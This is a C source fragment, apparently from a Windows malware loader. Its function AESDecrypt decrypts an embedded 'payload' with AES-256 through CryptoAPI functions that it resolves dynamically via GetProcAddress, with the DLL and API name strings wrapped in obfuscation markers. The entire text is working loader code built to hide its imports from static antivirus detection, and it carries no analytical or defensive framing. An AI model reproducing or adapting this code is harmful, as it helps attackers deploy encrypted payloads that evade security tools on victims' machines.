int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	typedef BOOL (WINAPI * CryptAcquireContextW_) (HCRYPTPROV *, LPCWSTR, LPCWSTR, DWORD, DWORD);
	CryptAcquireContextW_ _CryptAcquireContextW 	= (CryptAcquireContextW_)GetProcAddress(GetModuleHandle(<obf>"Advapi32.dll"<ob_end>), <obf>"CryptAcquireContextW"<ob_end>);
	typedef BOOL (WINAPI * CryptCreateHash_) (HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH *);
	CryptCreateHash_ _CryptCreateHash 			= (CryptCreateHash_)GetProcAddress(GetModuleHandle(<obf>"Advapi32.dll"<ob_end>), <obf>"CryptCreateHash"<ob_end>);
	typedef BOOL (WINAPI * CryptHashData_) (HCRYPTHASH, const BYTE *, DWORD, DWORD);
	CryptHashData_ _CryptHashData 			= (CryptHashData_)GetProcAddress(GetModuleHandle(<obf>"Advapi32.dll"<ob_end>), <obf>"CryptHashData"<ob_end>);
	typedef BOOL (WINAPI * CryptDeriveKey_) (HCRYPTPROV, ALG_ID, HCRYPTHASH, DWORD, HCRYPTKEY *);
	CryptDeriveKey_ _CryptDeriveKey 			= (CryptDeriveKey_)GetProcAddress(GetModuleHandle(<obf>"Advapi32.dll"<ob_end>), <obf>"CryptDeriveKey"<ob_end>);
	typedef BOOL (WINAPI * CryptDecrypt_) (HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE *, DWORD *);
	CryptDecrypt_ _CryptDecrypt 				= (CryptDecrypt_)GetProcAddress(GetModuleHandle(<obf>"Advapi32.dll"<ob_end>), <obf>"CryptDecrypt"<ob_end>);
	typedef BOOL (WINAPI * CryptReleaseContext_) (HCRYPTPROV, DWORD);
	CryptReleaseContext_ _CryptReleaseContext 	= (CryptReleaseContext_)GetProcAddress(GetModuleHandle(<obf>"Advapi32.dll"<ob_end>), <obf>"CryptReleaseContext"<ob_end>);
	typedef BOOL (WINAPI * CryptDestroyHash_) (HCRYPTHASH);
	CryptDestroyHash_ _CryptDestroyHash 	= (CryptDestroyHash_)GetProcAddress(GetModuleHandle(<obf>"Advapi32.dll"<ob_end>), <obf>"CryptDestroyHash"<ob_end>);


	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!_CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
		#ifdef DEBUG
			printf("[!!!] CryptAcquireContextW failed, error %d\n", GetLastError());
		#endif
		return -1;
	}
	if (!_CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
		#ifdef DEBUG
			printf("[!!!] CryptCreateHash failed, error %d\n", GetLastError());
		#endif
		return -1;
	}
	if (!_CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
		#ifdef DEBUG
			printf("[!!!] CryptHashData failed, error %d\n", GetLastError());
		#endif
		return -1;
	}
	if (!_CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
		#ifdef DEBUG
			printf("[!!!] CryptDeriveKey failed, error %d\n", GetLastError());
		#endif
		return -1;
	}

	if (!_CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
		#ifdef DEBUG
			printf("[!!!] CryptDecrypt failed, error %d\n", GetLastError());
		#endif
		return -1;
	}
	_CryptReleaseContext(hProv, 0);
	_CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}
